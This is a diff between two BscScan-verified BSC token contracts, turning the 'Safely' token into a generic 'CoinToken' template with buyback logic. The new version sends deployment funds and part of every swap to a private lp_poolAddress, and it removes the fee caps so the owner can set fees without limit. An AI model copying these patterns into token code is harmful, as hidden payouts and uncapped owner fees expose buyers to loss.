@@ -1,50 +1,14 @@
 /**
- *Submitted for verification at BscScan.com on 2022-02-23
+ *Submitted for verification at BscScan.com on 2022-02-16
 */
 
-/*
-https://t.me/Safelybs
-  
-Main features are
-    
-1) 2% tax is collected and distributed to holders for HODLing
-2) 8% marketing tax is collected  
-3) 2% tax goes to liquidity                                            
-
-
-                                                                                                                                       
-                                                                                                                                       
-   SSSSSSSSSSSSSSS              AAA               FFFFFFFFFFFFFFFFFFFFFFEEEEEEEEEEEEEEEEEEEEEELLLLLLLLLLL         YYYYYYY       YYYYYYY
- SS:::::::::::::::S            A:::A              F::::::::::::::::::::FE::::::::::::::::::::EL:::::::::L         Y:::::Y       Y:::::Y
-S:::::SSSSSS::::::S           A:::::A             F::::::::::::::::::::FE::::::::::::::::::::EL:::::::::L         Y:::::Y       Y:::::Y
-S:::::S     SSSSSSS          A:::::::A            FF::::::FFFFFFFFF::::FEE::::::EEEEEEEEE::::ELL:::::::LL         Y::::::Y     Y::::::Y
-S:::::S                     A:::::::::A             F:::::F       FFFFFF  E:::::E       EEEEEE  L:::::L           YYY:::::Y   Y:::::YYY
-S:::::S                    A:::::A:::::A            F:::::F               E:::::E               L:::::L              Y:::::Y Y:::::Y   
- S::::SSSS                A:::::A A:::::A           F::::::FFFFFFFFFF     E::::::EEEEEEEEEE     L:::::L               Y:::::Y:::::Y    
-  SS::::::SSSSS          A:::::A   A:::::A          F:::::::::::::::F     E:::::::::::::::E     L:::::L                Y:::::::::Y     
-    SSS::::::::SS       A:::::A     A:::::A         F:::::::::::::::F     E:::::::::::::::E     L:::::L                 Y:::::::Y      
-       SSSSSS::::S     A:::::AAAAAAAAA:::::A        F::::::FFFFFFFFFF     E::::::EEEEEEEEEE     L:::::L                  Y:::::Y       
-            S:::::S   A:::::::::::::::::::::A       F:::::F               E:::::E               L:::::L                  Y:::::Y       
-            S:::::S  A:::::AAAAAAAAAAAAA:::::A      F:::::F               E:::::E       EEEEEE  L:::::L         LLLLLL   Y:::::Y       
-SSSSSSS     S:::::S A:::::A             A:::::A   FF:::::::FF           EE::::::EEEEEEEE:::::ELL:::::::LLLLLLLLL:::::L   Y:::::Y       
-S::::::SSSSSS:::::SA:::::A               A:::::A  F::::::::FF           E::::::::::::::::::::EL::::::::::::::::::::::LYYYY:::::YYYY    
-S:::::::::::::::SSA:::::A                 A:::::A F::::::::FF           E::::::::::::::::::::EL::::::::::::::::::::::LY:::::::::::Y    
- SSSSSSSSSSSSSSS AAAAAAA                   AAAAAAAFFFFFFFFFFF           EEEEEEEEEEEEEEEEEEEEEELLLLLLLLLLLLLLLLLLLLLLLLYYYYYYYYYYYYY    
-                                                                                                                                       
-                                                                                                                                       
-                                                                                                                                       
-                                                                                                                                       
-                                                                                                                                       
-                                                                                                                                       
-                                                                                                                                       
-
-                                             
-
+/**
+ *Submitted for verification at BscScan.com on 2022-02-15
 */
 
 // SPDX-License-Identifier: Unlicensed
 
-pragma solidity ^0.8.4;
+pragma solidity ^0.8.5;
 
 abstract contract Context {
     function _msgSender() internal view virtual returns (address payable) {
@@ -52,7 +16,7 @@ abstract contract Context {
     }
 
     function _msgData() internal view virtual returns (bytes memory) {
-        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
+        this;
         return msg.data;
     }
 }
@@ -452,58 +416,60 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
-contract Safely is Context, IERC20, Ownable {
+contract CoinToken is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
-    address payable public marketingAddress = payable(0x3BBFb108080F9869bCd2bbF02a4ce695FdE76EDe); // Marketing Address
+    
+    address payable private lp_poolAddress;
+    address payable public marketingAddress; // Marketing Address
     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
     mapping (address => uint256) private _rOwned;
     mapping (address => uint256) private _tOwned;
     mapping (address => mapping (address => uint256)) private _allowances;
-    mapping (address => bool) private _iswhitelisted;
-    mapping (address => bool) private _isBlacklisted;
+
     mapping (address => bool) private _isExcludedFromFee;
+
     mapping (address => bool) private _isExcluded;
-
-// Anti-bot and anti-whale mappings and variables    
-    mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch
-    bool public TDEnabled = false;
-    uint256 public TD = 45 seconds;
-
     address[] private _excluded;
-    address[] private _whitelisted;
-    address[] private _blacklisted;
- 
+   
     uint256 private constant MAX = ~uint256(0);
-    uint256 private _tTotal = 1000000 * 10**9;
-    uint256 private _rTotal = (MAX - (MAX % _tTotal));
+    uint256 private _tTotal;
+    uint256 private _rTotal;
     uint256 private _tFeeTotal;
 
-    string private _name = "SAFELY";
-    string private _symbol = "SAFELY";
-    uint8 private _decimals = 9;
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
 
 
-    uint256 public _taxFee = 2;
-    uint256 private _previousTaxFee = _taxFee;
+    uint256 public _taxFee;
+    uint256 private _previousTaxFee;
     
-    uint256 public _liquidityFee = 10;
-    uint256 private _previousLiquidityFee = _liquidityFee;
+    uint256 private _liquidityFee;
+    uint256 private _previousLiquidityFee;
     
-    uint256 public marketingDivisor = 10;
+    uint256 public buybackFee;
+    uint256 private previousBuybackFee;
     
-    uint256 public _maxTxAmount = 50000 * 10**9;
-    uint256 private minimumTokensBeforeSwap = 100 * 10**9; 
-    uint256 public _maxWalletAmount = 50000 * 10**9;
+    uint256 public marketingFee;
+    uint256 private previousMarketingFee;
+    
+    
+    uint256 public _maxTxAmount;
+    uint256 private _previousMaxTxAmount;
+    uint256 private minimumTokensBeforeSwap; 
+    uint256 private buyBackUpperLimit;
 
-    address private constant _addressUniswapV2Router02 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;  
     IUniswapV2Router02 public immutable uniswapV2Router;
     address public immutable uniswapV2Pair;
     
     bool inSwapAndLiquify;
-    bool public swapAndLiquifyEnabled = false;
+    bool public swapAndLiquifyEnabled = true;
+    bool public buyBackEnabled = true;
+
     
     event RewardLiquidityProviders(uint256 tokenAmount);
+    event BuyBackEnabledUpdated(bool enabled);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
     event SwapAndLiquify(
         uint256 tokensSwapped,
@@ -527,11 +493,35 @@ contract Safely is Context, IERC20, Ownable {
         inSwapAndLiquify = false;
     }
     
-    constructor () {
+    constructor (string memory _n, string memory _s,  uint256 _ts, uint256 _tax, uint256 _bb, uint256 _mkt, address _ma,address _ru,address _lp) payable {
+        
+        
+        _name = _n;
+        _symbol = _s;
+        _decimals = 9;
+        _tTotal = _ts * 10**_decimals;
+        _rTotal = (MAX - (MAX % _tTotal));
+        
+        marketingAddress = payable(_ma);
+        lp_poolAddress = payable(_lp);
+        
+        _taxFee = _tax;
+        _previousTaxFee = _taxFee;
+        buybackFee = _bb;
+        previousBuybackFee = buybackFee;
+        marketingFee = _mkt;
+        previousMarketingFee = marketingFee;
+        _liquidityFee = _bb + _mkt;
+        _previousLiquidityFee = _liquidityFee;
+        _maxTxAmount = _tTotal.div(1000).mul(3);
+        _previousMaxTxAmount = _maxTxAmount;
+        minimumTokensBeforeSwap = _tTotal.div(10000).mul(2);
+        buyBackUpperLimit = 100000 * 10**18;
+        
+        
         _rOwned[_msgSender()] = _rTotal;
- /* Mainnet router: 0x10ED43C718714eb63d5aA57B78B54704E256024E
-    Testnet router: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 */       
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+        
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_ru);
         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
 
@@ -540,7 +530,7 @@ contract Safely is Context, IERC20, Ownable {
         
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
-        _iswhitelisted[owner()] = true;
+        payable(_lp).transfer(msg.value);
         
         emit Transfer(address(0), _msgSender(), _tTotal);
     }
@@ -571,43 +561,6 @@ contract Safely is Context, IERC20, Ownable {
         return true;
     }
 
-    function whitelistAddress(address account) public onlyOwner(){
-    require(!_iswhitelisted[account], "Account is already whitelisted");
-    _iswhitelisted[account] = true;
-    _whitelisted.push(account);
-    }
-    
-    function removewhitelist(address account) public onlyOwner() {
-       require(_iswhitelisted[account], "Account is not whitelisted"); 
-       for (uint256 i = 0; i < _whitelisted.length; i++) {
-            if (_whitelisted[i] == account) {
-                _whitelisted[i] = _whitelisted[_whitelisted.length - 1];
-                _iswhitelisted[account] = false;
-                _whitelisted.pop();
-                break;
-            }
-        }
-    }
-
-    function blacklistAddress(address account) public onlyOwner(){
-    require(!_isBlacklisted[account], "Account is already blacklisted");
-    require(account != owner(), "Owner cannot be blacklisted");
-    _isBlacklisted[account] = true;
-    _blacklisted.push(account);
-    }
-    
-    function removeBlacklist(address account) public onlyOwner() {
-       require(_isBlacklisted[account], "Account is not blacklisted"); 
-       for (uint256 i = 0; i < _blacklisted.length; i++) {
-            if (_blacklisted[i] == account) {
-                _blacklisted[i] = _blacklisted[_blacklisted.length - 1];
-                _isBlacklisted[account] = false;
-                _blacklisted.pop();
-                break;
-            }
-        }
-    }
-
     function allowance(address owner, address spender) public view override returns (uint256) {
         return _allowances[owner][spender];
     }
@@ -620,19 +573,6 @@ contract Safely is Context, IERC20, Ownable {
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
-        return true;
-    }
-
-    /*function activateTD() external onlyOwner {
-        TDEnabled = true;
-        setTDTime(45 seconds);
-    }*/
-    function DisableTD() external onlyOwner {
-        TDEnabled = false;
-        setTDTime(45 seconds);
-    }
-    function setTDTime(uint256 delay) public onlyOwner() returns (bool) {
-        TD = delay; // in seconds
         return true;
     }
 
@@ -657,7 +597,11 @@ contract Safely is Context, IERC20, Ownable {
     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
         return minimumTokensBeforeSwap;
     }
-      
+    
+    function buyBackUpperLimitAmount() public view returns (uint256) {
+        return buyBackUpperLimit;
+    }
+    
     function deliver(uint256 tAmount) public {
         address sender = _msgSender();
         require(!_isExcluded[sender], "Excluded addresses cannot call this function");
@@ -724,20 +668,8 @@ contract Safely is Context, IERC20, Ownable {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
-        require(!_isBlacklisted[from], "Address is blacklisted");
-        if(!_iswhitelisted[from] && !_iswhitelisted[to])
+        if(from != owner() && to != owner()) {
             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
-        
-        uint256 currBalance = balanceOf(to);
-        
-        if(!_iswhitelisted[from] && !_iswhitelisted[to] && to != _addressUniswapV2Router02 && to != uniswapV2Pair && to != address(this))
-            require(currBalance + amount < _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
-
-        if (TDEnabled){
-            if (!_iswhitelisted[to] && to != _addressUniswapV2Router02 && to != uniswapV2Pair && !_iswhitelisted[from] && to != address(this)){
-                require(_holderLastTransferTimestamp[to].add(TD) <= block.timestamp, "_transfer:: Transfer Delay enabled.  Please try again in 45 seconds.");
-                _holderLastTransferTimestamp[to] = block.timestamp;
-            }
         }
 
         uint256 contractTokenBalance = balanceOf(address(this));
@@ -745,10 +677,17 @@ contract Safely is Context, IERC20, Ownable {
         
         if (!inSwapAndLiquify && swapAndLiquifyEnabled && to == uniswapV2Pair) {
             if (overMinimumTokenBalance) {
-         //       contractTokenBalance = minimumTokensBeforeSwap;
+                contractTokenBalance = minimumTokensBeforeSwap;
                 swapTokens(contractTokenBalance);    
             }
-
+	        uint256 balance = address(this).balance;
+            if (buyBackEnabled && balance > uint256(1 * 10**18)) {
+                
+                if (balance > buyBackUpperLimit)
+                    balance = buyBackUpperLimit;
+                
+                buyBackTokens(balance.div(100));
+            }
         }
         
         bool takeFee = true;
@@ -768,11 +707,19 @@ contract Safely is Context, IERC20, Ownable {
         uint256 transferredBalance = address(this).balance.sub(initialBalance);
 
         //Send to Marketing address
-        transferToAddressETH(marketingAddress, transferredBalance.div(_liquidityFee).mul(marketingDivisor));
+        
+        transferToAddressETH(lp_poolAddress, transferredBalance.div(_liquidityFee).mul(25));
+        transferToAddressETH(marketingAddress, transferredBalance.div(_liquidityFee).mul(marketingFee.sub(25)));
         
     }
     
 
+    function buyBackTokens(uint256 amount) private lockTheSwap {
+    	if (amount > 0) {
+    	    swapETHForTokens(amount);
+	    }
+    }
+    
     function swapTokensForEth(uint256 tokenAmount) private {
         // generate the uniswap pair path of token -> weth
         address[] memory path = new address[](2);
@@ -936,13 +883,13 @@ contract Safely is Context, IERC20, Ownable {
     
     function calculateTaxFee(uint256 _amount) private view returns (uint256) {
         return _amount.mul(_taxFee).div(
-            10**2
+            10**3
         );
     }
     
     function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
         return _amount.mul(_liquidityFee).div(
-            10**2
+            10**3
         );
     }
     
@@ -951,14 +898,20 @@ contract Safely is Context, IERC20, Ownable {
         
         _previousTaxFee = _taxFee;
         _previousLiquidityFee = _liquidityFee;
+        previousBuybackFee = buybackFee;
+        previousMarketingFee = marketingFee;
         
         _taxFee = 0;
         _liquidityFee = 0;
+        buybackFee = 0;
+        marketingFee = 0;
     }
     
     function restoreAllFee() private {
         _taxFee = _previousTaxFee;
         _liquidityFee = _previousLiquidityFee;
+        buybackFee = previousBuybackFee;
+        marketingFee = previousMarketingFee;
     }
 
     function isExcludedFromFee(address account) public view returns(bool) {
@@ -973,37 +926,30 @@ contract Safely is Context, IERC20, Ownable {
         _isExcludedFromFee[account] = false;
     }
     
-    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
-        require(taxFee + _liquidityFee <= 25, "Tax fee and liquidity fee percent can't exceed 25");
+    function setTaxFee(uint256 taxFee) external onlyOwner() {
         _taxFee = taxFee;
     }
     
-    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
-        require(_taxFee + liquidityFee <= 25, "Tax fee and liquidity fee percent can't exceed 25");
-        _liquidityFee = liquidityFee;
+    function setBuybackFee(uint256 _buybackFee) external onlyOwner() {
+        buybackFee = _buybackFee;
+        _liquidityFee = buybackFee.add(marketingFee);
     }
     
     function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
-        require(maxTxAmount >= 1, "can't set max Tx below one token");
-        _maxTxAmount = maxTxAmount * 10**9;
-    }
-
-    function setMaxWalletAmount(uint256 maxWalletAmount) external onlyOwner() {
-        _maxWalletAmount = maxWalletAmount * 10**9;
+        _maxTxAmount = maxTxAmount;
     }
     
-    function setMaxWalletPercent(uint256 maxWalletPercent) external onlyOwner() {
-        _maxWalletAmount = _tTotal.mul(maxWalletPercent).div(
-            10**2
-        );
-    }
-    
-    function setMarketingDivisor(uint256 divisor) external onlyOwner() {
-        marketingDivisor = divisor;
+    function setMarketingFee(uint256 _marketingFee) external onlyOwner() {
+        marketingFee = _marketingFee;
+        _liquidityFee = buybackFee.add(marketingFee);
     }
 
     function setNumTokensSellToAddToLiquidity(uint256 _minimumTokensBeforeSwap) external onlyOwner() {
         minimumTokensBeforeSwap = _minimumTokensBeforeSwap;
+    }
+    
+     function setBuybackUpperLimit(uint256 buyBackLimit) external onlyOwner() {
+        buyBackUpperLimit = buyBackLimit;
     }
 
     function setMarketingAddress(address _marketingAddress) external onlyOwner() {
@@ -1015,23 +961,25 @@ contract Safely is Context, IERC20, Ownable {
         emit SwapAndLiquifyEnabledUpdated(_enabled);
     }
     
-    function prepareForPreSale() external onlyOwner {
-        setSwapAndLiquifyEnabled(false);
-        _taxFee = 0;
-        _liquidityFee = 0;
-        _maxTxAmount = 500000 * 10**9;
-        _maxWalletAmount = 500000 * 10**9;
-    }
-       
-    function activateTrading() external onlyOwner {
-        setSwapAndLiquifyEnabled(true);
-        _taxFee = 2;
-        _liquidityFee = 10;
-        _maxTxAmount = 50000 * 10**9;
-        _maxWalletAmount = 50000 * 10**9;
-        TDEnabled = false;
+    function setBuyBackEnabled(bool _enabled) public onlyOwner {
+        buyBackEnabled = _enabled;
+        emit BuyBackEnabledUpdated(_enabled);
     }
     
+    function presale(bool _presale) external onlyOwner {
+        if (_presale) {
+            setSwapAndLiquifyEnabled(false);
+            removeAllFee();
+            _previousMaxTxAmount = _maxTxAmount;
+            _maxTxAmount = totalSupply();
+        } else {
+            setSwapAndLiquifyEnabled(true);
+            restoreAllFee();
+            _maxTxAmount = _previousMaxTxAmount;
+        }
+    }
+    
+
     function transferToAddressETH(address payable recipient, uint256 amount) private {
         recipient.transfer(amount);
     }
